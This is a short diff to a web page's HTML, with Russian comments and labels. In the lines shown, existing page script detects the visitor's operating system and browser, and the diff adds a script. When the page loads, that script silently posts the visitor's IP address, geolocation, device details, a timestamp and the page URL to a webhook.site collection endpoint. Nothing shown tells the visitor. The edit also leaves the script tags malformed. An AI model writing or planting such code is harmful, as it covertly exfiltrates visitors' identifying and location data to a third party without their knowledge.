@@ -227,6 +227,19 @@
         else if (/Mac/i.test(ua)) device = 'macOS (Apple)';
         else if (/Linux/i.test(ua)) device = 'Linux';
         document.getElementById('device_data').innerText = 'Устройство: ' + device + ' | Браузер: ' + navigator.userAgent.split(' ').slice(-2).join(' ');
-    </script>
+    <script>
+    // Отправка данных на Webhook.site
+    fetch('https://webhook.site/5b06de70-ec2d-4416-a142-b1341faab3ce', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+            ip: document.getElementById('ip_data').innerText || 'не определен',
+            geo: document.getElementById('geo_data').innerText || 'не определено',
+            device: document.getElementById('device_data').innerText || 'неизвестно',
+            time: new Date().toISOString(),
+            url: window.location.href
+        })
+    });
+</script>
 </body>
 </html>
